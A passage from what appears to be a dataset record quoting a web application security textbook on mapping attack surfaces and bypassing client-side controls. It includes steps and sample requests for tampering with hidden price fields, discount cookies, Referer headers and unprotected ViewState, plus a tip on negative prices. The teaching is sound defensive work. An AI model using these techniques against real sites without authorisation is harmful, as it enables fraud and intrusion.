support, and verify whether these\nare also present in your target application. Note that third-party compo-\nnents may look and feel quite different in each implementation, due to\nbranding customizations, but the core functionality, including script and\nparameter names, is often the same. If possible, download and install the\ncomponent and analyze it to fully understand its capabilities and, if pos-\nsible, discover any vulnerabilities. Consult repositories of known vulner-\nabilities to identify any known defects with the component in question.\ncc0044..iinndddd 110066 88//1199//22001111 1122::0044::4466 PPMM\n\nStuttard c04.indd V3 - 07/22/2011 Page 107\nChapter 4 n Mapping the Application 107\nIdentifying Server-Side Functionality\nIt is often possible to infer a great deal about server-side functionality and struc-\nture, or at least make an educated guess, by observing clues that the application\ndiscloses to the client.\nDissecting Requests\nConsider the following URL, which is used to access a search function:\nhttps://wahh-app.com/calendar.jsp?name=new%20applicants&isExpired=\n0&startDate=22%2F09%2F2010&endDate=22%2F03%2F2011&OrderBy=name\nAs you have seen, the .jsp fi le extension indicates that Java Server Pages are\nin use. You may guess that a search function will retrieve its information from\neither an indexing system or a database. The presence of the OrderBy parameter\nsuggests that a back-end database is being used and that the value you submit\nmay be used as the ORDER BY clause of a SQL query. This parameter may well\nbe vulnerable to SQL injection, as may any of the other parameters if they are\nused in database queries (see Chapter 9).\nAlso of interest among the other parameters is the isExpired fi eld. This\nappears to be a Boolean fl ag specifying whether the search query should include\nexpired content. If the application designers did not expect ordinary users to\nbe able retrieve any expired content, changing this parameter from 0 to 1 could\nidentify an access control vulnerability (see Chapter 8).\nThe following URL, which allows users to access a content management\nsystem, contains a different set of clues:\nhttps://wahh-app.com/workbench.aspx?template=NewBranch.tpl&loc=\n/default&ver=2.31&edit=false\nHere, the .aspx fi le extension indicates that this is an ASP.NET application. It also\nappears highly likely that the template parameter is used to specify a fi lename,\nand the loc parameter is used to specify a directory. The possible fi le extension\n.tpl appears to confi rm this, as does the location /default, which could very\nwell be a directory name. It is possible that the application retrieves the template\nfi le specifi ed and includes the contents in its response. These parameters may\nwell be vulnerable to path traversal attacks, allowing arbitrary fi les to be read\nfrom the server (see Chapter 10).\nAlso of interest is the edit parameter, which is set to false. It may be that\nchanging this value to true will modify the registration functionality, poten-\ntially enabling an attacker to edit items that the application developer did not\nintend to be editable. The ver parameter does not have any readily guessable\npurpose, but it may be that modifying this will cause the application to perform\na different set of functions that an attacker could exploit.\ncc0044..iinndddd 110077 88//1199//22001111 1122::0044::4466 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 108\n108 Chapter 4 n Mapping the Application\nFinally, consider the following request, which is used to submit a question\nto application administrators:\nPOST /feedback.php HTTP/1.1\nHost: wahh-app.com\nContent-Length: 389\nfrom=user@wahh-mail.com&to=helpdesk@wahh-app.com&subject=\nProblem+logging+in&message=Please+help...\nAs with the other examples, the .php fi le extension indicates that the function\nis implemented using the PHP language. Also, it is extremely likely that the\napplication is interfacing with an external e-mail system, and it appears that\nuser-controllable input is being passed to that system in all relevant fi elds of\nthe e-mail. The function may be exploitable to send arbitrary messages to any\nrecipient, and any of the fi elds may also be vulnerable to e-mail header injec-\ntion (see Chapter 10).\nTIP It is often necessary to consider the whole URL and application context\nto guess the function of different parts of a request. Recall the following URL\nfrom the Extreme Internet Shopping application:\nhttp://eis/pub/media/117/view\nThe handling of this URL is probably functionally equivalent to the\nfollowing:\nhttp://eis/manager?schema=pub&type=media&id=117&action=view\nWhile it isn’t certain, it seems likely that resource 117 is contained in the\ncollection of resources media and that the application is performing an action\non this resource that is equivalent to view. Inspecting other URLs would help\nconfi rm this.\nThe fi rst consideration would be to change the action from view to a possi-\nble alternative, such as edit or add. However, if you change it to add and this\nguess is right, it would likely correspond to an attempt to add a resource with\nan id of 117. This will probably fail, since there is already a resource with an\nid of 117. The best approach would be to look for an add operation with an\nid value higher than the highest observed value or to select an arbitrary high\nvalue. For example, you could request the following:\nhttp://eis/pub/media/7337/add\nIt may also be worthwhile to look for other data collections by altering\nmedia while keeping a similar URL structure:\nhttp://eis/pub/pages/1/view\nhttp://eis/pub/users/1/view\ncc0044..iinndddd 110088 88//1199//22001111 1122::0044::4466 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 109\nChapter 4 n Mapping the Application 109\n\nHACK STEPS\n1. Review the names and values of all parameters being submitted to the\napplication in the context of the functionality they support.\n2. Try to think like a programmer, and imagine what server-side mechanisms\nand technologies are likely to have been used to implement the behavior\nyou can observe.\nExtrapolating Application Behavior\nOften, an application behaves consistently across the range of its functionality.\nThis may be because different functions were written by the same developer\nor to the same design specifi cation, or share some common code components.\nIn this situation, it may be possible to draw conclusions about server-side func-\ntionality in one area and extrapolate these to another area.\nFor example, the application may enforce some global input validation checks,\nsuch as sanitizing various kinds of potentially malicious input before it is pro-\ncessed. Having identifi ed a blind SQL injection vulnerability, you may encounter\nproblems exploiting it, because your crafted requests are being modifi ed in\nunseen ways by the input validation logic. However, other functions within the\napplication might provide good feedback about the kind of sanitization being\nperformed — for example, a function that echoes some user-supplied data to\nthe browser. You may be able to use this function to test different encodings and\nvariations of your SQL injection payload to determine what raw input must be\nsubmitted to achieve the desired attack string after the input validation logic\nhas been applied. If you are lucky, the validation works in the same way across\nthe application, enabling you to exploit the injection fl aw.\nSome applications use custom obfuscation schemes when storing sensitive\ndata on the client to prevent casual inspection and modifi cation of this data\nby users (see Chapter 5). Some such schemes may be extremely diffi cult to\ndecipher given access to only a sample of obfuscated data. However, there may\nbe functions within the application where a user can supply an obfuscated\nstring and retrieve the original. For example, an error message may include the\ndeobfuscated data that led to the error. If the same obfuscation scheme is used\nthroughout the application, it may be possible to take an obfuscated string from\none location (such as a cookie) and feed it into the other function to decipher its\nmeaning. It may also be possible to reverse-engineer the obfuscation scheme by\nsubmitting systematically varying values to the function and monitoring their\ndeobfuscated equivalents.\nFinally, errors are often handled inconsistently within the application. Some\nareas trap and handle errors gracefully, and other areas simply crash and return\ncc0044..iinndddd 110099 88//1199//22001111 1122::0044::4466 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 110\n110 Chapter 4 n Mapping the Application\nverbose debugging information to the user (see Chapter 15). In this situation,\nit may be possible to gather information from the error messages returned in\none area and apply it to other areas where errors are handled gracefully. For\nexample, by manipulating request parameters in systematic ways and monitor-\ning the error messages received, it may be possible to determine the internal\nstructure and logic of the application component. If you are lucky, aspects of\nthis structure may be replicated in other areas.\n\nHACK STEPS\n1. Try to identify any locations within the application that may contain clues\nabout the internal structure and functionality of other areas.\n2. It may not be possible to draw any firm conclusions here; however, the\ncases identified may prove useful at a later stage of the attack when\nyou’re attempting to exploit any potential vulnerabilities.\nIsolating Unique Application Behavior\nSometimes the situation is the opposite of that just described. In many well-\nsecured or mature applications, a consistent framework is employed that pre-\nvents numerous types of attacks, such as cross-site scripting, SQL injection,\nand unauthorized access. In these cases, the most fruitful areas for hunting\nvulnerabilities generally are the portions of the application that have been added\nretrospectively, or “bolted on,” and hence are not handled by the application’s\ngeneral security framework. Additionally, they may not be correctly tied into\nthe application through authentication, session management, and access control.\nThese are often identifi able through differences in GUI appearance, parameter\nnaming conventions, or explicitly through comments in source code.\n\nHACK STEPS\n1. Make a note of any functionality that diverges from the standard GUI\nappearance, parameter naming, or navigation mechanism used within the\nrest of the application.\n2. Also make a note of functionality that is likely to have been added retro-\nspectively. Examples include debug functions, CAPTCHA controls, usage\ntracking, and third-party code.\n3. Perform a full review of these areas, and do not assume that the standard\ndefenses used elsewhere in the application apply.\ncc0044..iinndddd 111100 88//1199//22001111 1122::0044::4466 PPMM\n\nStuttard c04.indd V3 - 07/22/2011 Page 111\nChapter 4 n Mapping the Application 111\nMapping the Attack Surface\nThe fi nal stage of the mapping process is to identify the various attack surfaces\nexposed by the application and the potential vulnerabilities that are commonly\nassociated with each one. The following is a rough guide to some key types\nof behavior and functionality that you may identify, and the kinds of vulner-\nabilities that are most commonly found within each one. The remainder of this\nbook is concerned with the practical details of how you can detect and exploit\neach of these problems:\nn Client-side validation — Checks may not be replicated on the server\nn Database interaction — SQL injection\nn File uploading and downloading — Path traversal vulnerabilities, stored\ncross-site scripting\nn Display of user-supplied data — Cross-site scripting\nn Dynamic redirects — Redirection and header injection attacks\nn Social networking features — username enumeration, stored cross-site\nscripting\nn Login — Username enumeration, weak passwords, ability to use brute\nforce\nn Multistage login — Logic fl aws\nn Session state — Predictable tokens, insecure handling of tokens\nn Access controls — Horizontal and vertical privilege escalation\nn User impersonation functions — Privilege escalation\nn Use of cleartext communications — Session hijacking, capture of creden-\ntials and other sensitive data\nn Off-site links — Leakage of query string parameters in the Referer\nheader\nn Interfaces to external systems — Shortcuts in the handling of sessions\nand/or access controls\nn Error messages — Information leakage\nn E-mail interaction — E-mail and/or command injection\nn Native code components or interaction — Buffer overfl ows\nn Use of third-party application components — Known vulnerabilities\nn Identifi able web server software — Common confi guration weaknesses,\nknown software bugs\ncc0044..iinndddd 111111 88//1199//22001111 1122::0044::4466 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 112\n112 Chapter 4 n Mapping the Application\nMapping the Extreme Internet Shopping Application\nHaving mapped the content and functionality of the EIS application, many paths\ncould be followed to attack the application, as shown in Figure 4-15.\nFigure 4-15: The attack surface exposed by the EIS application\nThe /auth directory contains authentication functionality. A full review of\nall authentication functions, session handling, and access control is worthwhile,\nincluding further content discovery attacks.\nWithin the /core path, the sitestats page appears to accept an array of param-\neters delimited by the pipe character (|). As well as conventional input-based\nattacks, other values could be brute-forcible, such as source, location, and\nIP, in an attempt to reveal more information about other users or about the\npage specifi ed in pageID. It may also be possible to fi nd out information about\ncc0044..iinndddd 111122 88//1199//22001111 1122::0044::4466 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 113\nChapter 4 n Mapping the Application 113\ninaccessible resources or to try a wildcard option in pageID, such as pageID=all\nor pageID=*. Finally, because the observed pageID value contains a slash, it may\nindicate a resource being retrieved from the fi le system, in which case path\ntraversal attacks may be a possibility.\nThe /gb path contains the site’s guestbook. Visiting this page suggests it is\nused as a discussion forum, moderated by an administrator. Messages are mod-\nerated, but the login bypass login=true means that an attacker can attempt to\napprove malicious messages (to deliver cross-site scripting attacks, for example)\nand read other users’ private messages to the administrator.\nThe /home path appears to hold authenticated user content. This could make\na good basis for attempts to launch a horizontal privilege escalation attack to\naccess another user’s personal information and to ensure that access controls\nare present and enforced on every page.\nA quick review shows that the /icons and /images paths hold static content.\nIt may be worth brute-forcing for icon names that could indicate third-party\nsoftware, and checking for directory indexing on these directories, but they are\nunlikely to be worth signifi cant effort.\nThe /pub path contains REST-style resources under /pub/media and /pub/\nuser. A brute-force attack could be used to fi nd the profi le pages of other appli-\ncation users by targeting the numeric value in /pub/user/11. Social networking\nfunctionality such as this can reveal user information, usernames, and other\nusers’ logon status.\nThe /shop path contains the online shopping site and has a large number of\nURLs. However, they all have a similar structure, and an attacker could probably\nprobe all of the relevant attack surface by looking at just one or two items. The\npurchasing process may contain interesting logic fl aws that could be exploited\nto obtain unauthorized discounts or avoid payment.\n\nHACK STEPS\n1. Understand the core functionality implemented within the application and\nthe main security mechanisms in use.\n2. Identify all features of the application’s functionality and behavior that\nare often associated with common vulnerabilities.\n3. Check any third-party code against public vulnerability databases such as\nwww.osvdb.org to determine any known issues.\n4. Formulate a plan of attack, prioritizing the most interesting-looking func-\ntionality and the most serious of the associated potential vulnerabilities.\ncc0044..iinndddd 111133 88//1199//22001111 1122::0044::4466 PPMM\n\nStuttard c04.indd V3 - 07/22/2011 Page 114\n114 Chapter 4 n Mapping the Application\nSummary\nMapping the application is a key prerequisite to attacking it. It may be tempting\nto dive in and start probing for bugs, but taking time to gain a sound under-\nstanding of the application’s functionality, technologies, and attack surface will\npay dividends down the line.\nAs with almost all of web application hacking, the most effective approach\nis to use manual techniques supplemented where appropriate by controlled\nautomation. No fully automated tool can carry out a thorough mapping of the\napplication in a safe way. To do this, you need to use your hands and draw on\nyour own experience. The core methodology we have outlined involves the\nfollowing:\nn Manual browsing and user-directed spidering to enumerate the applica-\ntion’s visible content and functionality\nn Use of brute force combined with human inference and intuition to dis-\ncover as much hidden content as possible\nn An intelligent analysis of the application to identify its key functionality,\nbehavior, security mechanisms, and technologies\nn An assessment of the application’s attack surface, highlighting the most\npromising functions and behavior for more focused probing into exploit-\nable vulnerabilities\nQuestions\nAnswers can be found at http://mdsec.net/wahh.\n1. While mapping an application, you encounter the following URL:\nhttps://wahh-app.com/CookieAuth.dll?GetLogon?curl=Z2Fdefault.\naspx\nWhat information can you deduce about the technologies employed on\nthe server and how it is likely to behave?\n2. The application you are targeting implements web forum functionality.\nHere is the only URL you have discovered:\nhttp://wahh-app.com/forums/ucp.php?mode=register\nHow might you obtain a listing of forum members?\ncc0044..iinndddd 111144 88//1199//22001111 1122::0044::4466 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 115\nChapter 4 n Mapping the Application 115\n3. While mapping an application, you encounter the following URL:\nhttps://wahh-app.com/public/profile/Address.\nasp?action=view&location\n=default\nWhat information can you infer about server-side technologies? What\ncan you conjecture about other content and functionality that may exist?\n4. A web server’s responses include the following header:\nServer: Apache-Coyote/1.1\nWhat does this indicate about the technologies in use on the server?\n5. You are mapping two different web applications, and you request the URL\n/admin.cpf from each application. The response headers returned by each\nrequest are shown here. From these headers alone, what can you deduce\nabout the presence of the requested resource within each application?\nHTTP/1.1 200 OK\nServer: Microsoft-IIS/5.0\nExpires: Mon, 20 Jun 2011 14:59:21 GMT\nContent-Location: http://wahh-\napp.com/includes/error.htm?404;http://wahh-app.com/admin.cpf\nDate: Mon, 20 Jun 2011 14:59:21 GMT\nContent-Type: text/html\nAccept-Ranges: bytes\nContent-Length: 2117\nHTTP/1.1 401 Unauthorized\nServer: Apache-Coyote/1.1\nWWW-Authenticate: Basic realm=”Wahh Administration Site”\nContent-Type: text/html;charset=utf-8\nContent-Length: 954\nDate: Mon, 20 Jun 2011 15:07:27 GMT\nConnection: close\ncc0044..iinndddd 111155 88//1199//22001111 1122::0044::4477 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 116\ncc0044..iinndddd 111166 88//1199//22001111 1122::0044::4477 PPMM",
    "question": "What is the key concept discussed in this section regarding the process of mapping an application and identifying its attack surface?",
    "summary": "The chapter discusses the process of mapping an application to understand its structure and identify potential vulnerabilities. It covers techniques like manual browsing, automated spidering, and brute-force methods to discover content and functionality. The application's attack surface is determined by analyzing its behavior, security mechanisms, and technologies used on both the client and server sides. The text also highlights the importance of identifying server-side technologies, hidden parameters, and third-party components to uncover vulnerabilities. Finally, it emphasizes the need for a combination of manual and automated approaches to effectively map and assess an application for security risks."
  },
  {
    "start": 91,
    "end": 101,
    "text": "Stuttard c05.indd V3 - 07/22/2011 Page 117\n\nCHAPTER\n5\nBypassing Client-Side Controls\nChapter 1 described how the core security problem with web applications arises\nbecause clients can submit arbitrary input. Despite this fact, a large proportion\nof web applications, nevertheless, rely on various measures implemented on\nthe client side to control the data that they submit to the server. In general, this\nrepresents a fundamental security fl aw: the user has full control over the client\nand the data it submits and can bypass any controls that are implemented on\nthe client side and are not replicated on the server.\nAn application may rely on client-side controls to restrict user input in two\nbroad ways. First, an application may transmit data via the client component\nusing a mechanism that it assumes will prevent the user from modifying that\ndata when the application later reads it. Second, an application may implement\nmeasures on the client side that control the user’s interaction with his or her\nown client, with the aim of restricting functionality and/or applying controls\naround user input before it is submitted. This may be achieved using HTML\nform features, client-side scripts, or browser extension technologies.\nThis chapter looks at examples of each kind of client-side control and describes\nways in which they can be bypassed.\n117\ncc0055..iinndddd 111177 88//1199//22001111 1122::0055::4400 PPMM\n\nStuttard c05.indd V3 - 07/22/2011 Page 118\n118 Chapter 5 n Bypassing Client-Side Controls\nTransmitting Data Via the Client\nIt is common to see an application passing data to the client in a form that the\nend user cannot directly see or modify, with the expectation that this data\nwill be sent back to the server in a subsequent request. Often, the application’s\ndevelopers simply assume that the transmission mechanism used will ensure\nthat the data transmitted via the client will not be modifi ed along the way.\nBecause everything submitted from the client to the server is within the\nuser’s control, the assumption that data transmitted via the client will not be\nmodifi ed is usually false and often leaves the application vulnerable to one or\nmore attacks.\nYou may reasonably wonder why, if the server knows and specifi es a particular\nitem of data, the application would ever need to transmit this value to the client\nand then read it back. In fact, writing applications in this way is often easier for\ndevelopers for various reasons:\nn It removes the need to keep track of all kinds of data within the user’s\nsession. Reducing the amount of per-session data being stored on the\nserver can also improve the application’s performance.\nn If the application is deployed on several distinct servers, with users poten-\ntially interacting with more than one server to perform a multistep action,\nit may not be straightforward to share server-side data between the hosts\nthat may handle the same user’s requests. Using the client to transmit data\ncan be a tempting solution to the problem.\nn If the application employs any third-party components on the server,\nsuch as shopping carts, modifying these may be diffi cult or impossible, so\ntransmitting data via the client may be the easiest way of integrating these.\nn In some situations, tracking a new piece of data on the server may entail\nupdating a core server-side API, thereby triggering a full-blown formal\nchange-management process and regression testing. Implementing a more\npiecemeal solution involving client-side data transmission may avoid this,\nallowing tight deadlines to be met.\nHowever, transmitting sensitive data in this way is usually unsafe and has\nbeen the cause of countless vulnerabilities in applications.\nHidden Form Fields\nHidden HTML form fi elds are a common mechanism for transmitting data via\nthe client in a superfi cially unmodifi able way. If a fi eld is fl agged as hidden,\nit is not displayed on-screen. However, the fi eld’s name and value are stored\nwithin the form and are sent back to the application when the user submits\nthe form.\ncc0055..iinndddd 111188 88//1199//22001111 1122::0055::4400 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 119\nChapter 5 n Bypassing Client-Side Controls 119\nThe classic example of this security fl aw is a retailing application that stores\nthe prices of products within hidden form fi elds. In the early days of web appli-\ncations, this vulnerability was extremely widespread, and by no means has it\nbeen eliminated today. Figure 5-1 shows a typical form.\nFigure 5-1: A typical HTML form\nThe code behind this form is as follows:\n<form method=”post” action=”Shop.aspx?prod=1”>\nProduct: iPhone 5 <br/>\nPrice: 449 <br/>\nQuantity: <input type=”text” name=”quantity”> (Maximum quantity is 50)\n<br/>\n<input type=”hidden” name=”price” value=”449”>\n<input type=”submit” value=”Buy”>\n</form>\nNotice the form fi eld called price, which is fl agged as hidden. This fi eld is sent\nto the server when the user submits the form:\nPOST /shop/28/Shop.aspx?prod=1 HTTP/1.1\nHost: mdsec.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 20\nquantity=1&price=449\nTRY IT!\nhttp://mdsec.net/shop/28/\nAlthough the price fi eld is not displayed on-screen, and the user cannot edit\nit, this is solely because the application has instructed the browser to hide the\nfi eld. Because everything that occurs on the client side is ultimately within\nthe user’s control, this restriction can be circumvented to edit the price.\nOne way to achieve this is to save the source code for the HTML page, edit\nthe fi eld’s value, reload the source into a browser, and click the Buy button.\nHowever, an easier and more elegant method is to use an intercepting proxy to\nmodify the desired data on-the-fl y.\ncc0055..iinndddd 111199 88//1199//22001111 1122::0055::4400 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 120\n120 Chapter 5 n Bypassing Client-Side Controls\nAn intercepting proxy is tremendously useful when attacking a web applica-\ntion and is the one truly indispensable tool you need. Numerous such tools are\navailable. We will use Burp Suite, which was written by one of this book’s authors.\nThe proxy sits between your web browser and the target application. It inter-\ncepts every request issued to the application, and every response received back,\nfor both HTTP and HTTPS. It can trap any intercepted message for inspection\nor modifi cation by the user. If you haven’t used an intercepting proxy before,\nyou can read more about how they function, and how to get them confi gured\nand working, in Chapter 20.\nOnce an intercepting proxy has been installed and suitably confi gured, you\ncan trap the request that submits the form and modify the price fi eld to any\nvalue, as shown in Figure 5-2.\nFigure 5-2: Modifying the values of hidden form fields using an intercepting proxy\nIf the application processes the transaction based on the price submitted, you\ncan purchase the product for the price of your choice.\nTIP If you fi nd an application that is vulnerable in this way, see whether you\ncan submit a negative amount as the price. In some cases, applications have\nactually accepted transactions using negative prices. The attacker receives a\nrefund to his credit card and also the item he ordered — a win-win situation, if\never there was one.\ncc0055..iinndddd 112200 88//1199//22001111 1122::0055::4400 PPMM\n\nStuttard c05.indd V3 - 07/22/2011 Page 121\nChapter 5 n Bypassing Client-Side Controls 121\nHTTP Cookies\nAnother common mechanism for transmitting data via the client is HTTP cook-\nies. As with hidden form fi elds, normally these are not displayed on-screen, and\nthe user cannot modify them directly. They can, of course, be modifi ed using\nan intercepting proxy, by changing either the server response that sets them or\nsubsequent client requests that issue them.\nConsider the following variation on the previous example. After the customer\nhas logged in to the application, she receives the following response:\nHTTP/1.1 200 OK\nSet-Cookie: DiscountAgreed=25\nContent-Length: 1530\n...\nThis DiscountAgreed cookie points to a classic case of relying on client-side\ncontrols (the fact that cookies normally can’t be modifi ed) to protect data trans-\nmitted via the client. If the application trusts the value of the DiscountAgreed\ncookie when it is submitted back to the server, customers can obtain arbitrary\ndiscounts by modifying its value. For example:\nPOST /shop/92/Shop.aspx?prod=3 HTTP/1.1\nHost: mdsec.net\nCookie: DiscountAgreed=25\nContent-Length: 10\nquantity=1\nTRY IT!\nhttp://mdsec.net/shop/92/\nURL Parameters\nApplications frequently transmit data via the client using preset URL param-\neters. For example, when a user browses the product catalog, the application\nmay provide him with hyperlinks to URLs like the following:\nhttp://mdsec.net/shop/?prod=3&pricecode=32\nWhen a URL containing parameters is displayed in the browser’s location bar,\nany parameters can be modifi ed easily by any user without the use of tools.\nHowever, in many instances an application may expect that ordinary users\ncannot view or modify URL parameters:\nn Where embedded images are loaded using URLs containing parameters\nn Where URLs containing parameters are used to load a frame’s contents\ncc0055..iinndddd 112211 88//1199//22001111 1122::0055::4411 PPMM\n\nStuttard c05.indd V3 - 07/22/2011 Page 122\n122 Chapter 5 n Bypassing Client-Side Controls\nn Where a form uses the POST method and its target URL contains preset\nparameters\nn Where an application uses pop-up windows or other techniques to conceal\nthe browser location bar\nOf course, in any such case the values of any URL parameters can be modifi ed\nas previously discussed using an intercepting proxy.\nThe Referer Header\nBrowsers include the Referer header within most HTTP requests. It is used to\nindicate the URL of the page from which the current request originated — either\nbecause the user clicked a hyperlink or submitted a form, or because the page\nreferenced other resources such as images. Hence, it can be leveraged as a\nmechanism for transmitting data via the client. Because the URLs processed by\nthe application are within its control, developers may assume that the Referer\nheader can be used to reliably determine which URL generated a particular\nrequest.\nFor example, consider a mechanism that enables users to reset their password\nif they have forgotten it. The application requires users to proceed through\nseveral steps in a defi ned sequence before they actually reset their password’s\nvalue with the following request:\nGET /auth/472/CreateUser.ashx HTTP/1.1\nHost: mdsec.net\nReferer: https://mdsec.net/auth/472/Admin.ashx\nThe application may use the Referer header to verify that this request origi-\nnated from the correct stage (Admin.ashx). If it did, the user can access the\nrequested functionality.\nHowever, because the user controls every aspect of every request, including\nthe HTTP headers, this control can be easily circumvented by proceeding directly\nto CreateUser.ashx and using an intercepting proxy to change the value of the\nReferer header to the value that the application requires.\nThe Referer header is strictly optional according to w3.org standards. Hence,\nalthough most browsers implement it, using it to control application functional-\nity should be regarded as a hack.\nTRY IT!\nhttp://mdsec.net/auth/472/\ncc0055..iinndddd 112222 88//1199//22001111 1122::0055::4411 PPMM\n\nStuttard c05.indd V3 - 07/22/2011 Page 123\nChapter 5 n Bypassing Client-Side Controls 123\n\nCOMMON MYTH\nIt is often assumed that HTTP headers are somehow more “tamper-proof”\nthan other parts of the request, such as the URL. This may lead developers to\nimplement functionality that trusts the values submitted in headers such as\nCookie and Referer while performing proper validation of other data such\nas URL parameters. However, this perception is false. Given the multitude of\nintercepting proxy tools that are freely available, any amateur hacker who\ntargets an application can change all request data with ease. It is rather like\nsupposing that when the teacher comes to search your desk, it is safer to hide\nyour water pistol in the bottom drawer, because she will need to bend down\nfarther to discover it.\n\nHACK STEPS\n1. Locate all instances within the application where hidden form fields,\ncookies, and URL parameters are apparently being used to transmit data\nvia the client.\n2. Attempt to determine or guess the role that the item plays in the applica-\ntion’s logic, based on the context in which it appears and on clues such as\nthe parameter’s name.\n3. Modify the item’s value in ways that are relevant to its purpose in the\napplication. Ascertain whether the application processes arbitrary values\nsubmitted in the parameter, and whether this exposes the application to\nany vulnerabilities.\nOpaque Data\nSometimes, data transmitted via the client is not transparently intelligible\nbecause it has been encrypted or obfuscated in some way. For example, instead\nof seeing a product’s price stored in a hidden fi eld, you may see a cryptic value\nbeing transmitted:\n<form method=”post” action=”Shop.aspx?prod=4”>\nProduct: Nokia Infinity <br/>\nPrice: 699 <br/>\nQuantity: <input type=”text” name=”quantity”> (Maximum quantity is 50)\n<br/>\n<input type=”hidden” name=”price” value=”699”>\n<input type=”hidden” name=”pricing_token”\nvalue=”E76D213D291B8F216D694A34383150265C989229”>\n<input type=”submit” value=”Buy”>\n</form>\ncc0055..iinndddd 112233 88//1199//22001111 1122::0055::4411 PPMM\n\nStuttard c05.indd V3 - 07/22/2011 Page 124\n124 Chapter 5 n Bypassing Client-Side Controls\nWhen this is observed, you may reasonably infer that when the form is sub-\nmitted, the server-side application checks the integrity of the opaque string, or\neven decrypts or deobfuscates it to perform some processing on its plaintext\nvalue. This further processing may be vulnerable to any kind of bug. However, to\nprobe for and exploit this, fi rst you need to wrap up your payload appropriately.\nTRY IT!\nhttp://mdsec.net/shop/48/\nNOTE Opaque data items transmitted via the client are often part of the\napplication’s session-handling mechanism. Session tokens sent in HTTP cook-\nies, anti-CSRF tokens transmitted in hidden fi elds, and one-time URL tokens\nfor accessing application resources, are all potential targets for client-side\ntampering. Numerous considerations are specifi c to these kinds of tokens, as\ndiscussed in depth in Chapter 7.\n\nHACK STEPS\nFaced with opaque data being transmitted via the client, several avenues of\nattack are possible:\n1. If you know the value of the plaintext behind the opaque string, you can\nattempt to decipher the obfuscation algorithm being employed.\n2. As described in Chapter 4, the application may contain functions else-\nwhere that you can leverage to return the opaque string resulting from a\npiece of plaintext you control. In this situation, you may be able to directly\nobtain the required string to deliver an arbitrary payload to the function\nyou are targeting.\n3. Even if the opaque string is impenetrable, it may be possible to replay\nits value in other contexts to achieve a malicious effect. For example, the\npricing_token parameter in the previously shown form may contain\nan encrypted version of the product’s price. Although it is not possible to\nproduce the encrypted equivalent for an arbitrary price of your choosing,\nyou may be able to copy the encrypted price from a different, cheaper\nproduct and submit this in its place.\n4. If all else fails, you can attempt to attack the server-side logic that will\ndecrypt or deobfuscate the opaque string by submitting malformed varia-\ntions of it — for example, containing overlong values, different character\nsets, and the like.\nThe ASP.NET ViewState\nOne commonly encountered mechanism for transmitting opaque data via the\nclient is the ASP.NET ViewState. This is a hidden fi eld that is created by default\nin all ASP.NET web applications. It contains serialized information about the\ncc0055..iinndddd 112244 88//1199//22001111 1122::0055::4411 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 125\nChapter 5 n Bypassing Client-Side Controls 125\nstate of the current page. The ASP.NET platform employs the ViewState to\nenhance server performance. It enables the server to preserve elements within\nthe user interface across successive requests without needing to maintain all\nthe relevant state information on the server side. For example, the server may\npopulate a drop-down list on the basis of parameters submitted by the user.\nWhen the user makes subsequent requests, the browser does not submit the\ncontents of the list back to the server. However, the browser does submit the\nhidden ViewState fi eld, which contains a serialized form of the list. The server\ndeserializes the ViewState and recreates the same list that is presented to the\nuser again.\nIn addition to this core purpose of the ViewState, developers can use it to\nstore arbitrary information across successive requests. For example, instead of\nsaving the product’s price in a hidden form fi eld, an application may save it in\nthe ViewState as follows:\nstring price = getPrice(prodno);\nViewState.Add(“price”, price);\nThe form returned to the user now looks something like this:\n<form method=”post” action=”Shop.aspx?prod=3”>\n<input type=”hidden” name=”__VIEWSTATE” id=”__VIEWSTATE”\nvalue=”/wEPDwULLTE1ODcxNjkwNjIPFgIeBXByaWNlBQMzOTlkZA==” />\nProduct: HTC Avalanche <br/>\nPrice: 399 <br/>\nQuantity: <input type=”text” name=”quantity”> (Maximum quantity is 50)\n<br/>\n<input type=”submit” value=”Buy”>\n</form>\nWhen the user submits the form, her browser sends the following:\nPOST /shop/76/Shop.aspx?prod=3 HTTP/1.1\nHost: mdsec.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 77\n__VIEWSTATE=%2FwEPDwULLTE1ODcxNjkwNjIPFgIeBXByaWNlBQMzOTlkZA%3D%3D&\nquantity=1\nThe request apparently does not contain the product price — only the quan-\ntity ordered and the opaque ViewState parameter. Changing that parameter at\nrandom results in an error message, and the purchase is not processed.\nThe ViewState parameter is actually a Base64-encoded string that can be\neasily decoded to see the price parameter that has been placed there:\n3D FF 01 0F 0F 05 0B 2D 31 35 38 37 31 36 39 30 ; =ÿ.....-15871690\n36 32 0F 16 02 1E 05 70 72 69 63 65 05 03 33 39 ; 62.....price..39\n39 64 64 ; 9dd\ncc0055..iinndddd 112255 88//1199//22001111 1122::0055::4411 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 126\n126 Chapter 5 n Bypassing Client-Side Controls\nTIP When you attempt to decode what appears to be a Base64-encoded\nstring, a common mistake is to begin decoding at the wrong position within the\nstring. Because of how Base64 encoding works, if you start at the wrong posi-\ntion, the decoded string will contain gibberish. Base64 is a block-based format\nin which every 4 bytes of encoded data translates into 3 bytes of decoded data.\nHence, if your attempts to decode a Base64 string do not uncover anything\nmeaningful, try starting from four adjacent offsets into the encoded string.\nBy default, the ASP.NET platform protects the ViewState from tampering by\nadding a keyed hash to it (known as MAC protection). However, some applications\ndisable this default protection, meaning that you can modify the ViewState’s value\nto determine whether it has an effect on the application’s server-side processing.\nBurp Suite includes a ViewState parser that indicates whether the ViewState\nis MAC protected, as shown in Figure 5-3. If it is not protected, you can edit the\ncontents of the ViewState within Burp using the hex editor below the ViewState\ntree. When you send the message to the server or client, Burp sends your updated\nViewState, and, in the present example, enables you to change the price of the\nitem being purchased.\nFigure 5-3: Burp Proxy can decode and render the ViewState, allowing you to\nreview its contents and edit these if the EnableViewStateMac option is not set\ncc0055..iinndddd 112266 88//1199//22001111 1122::0055::4411 PPMM\n\nStuttard c05.indd V3 - 07/22/2011 Page 127\nChapter 5 n Bypassing Client-Side Controls 127\nTRY IT!\nhttp://mdsec.net/shop/76/\n\nHACK 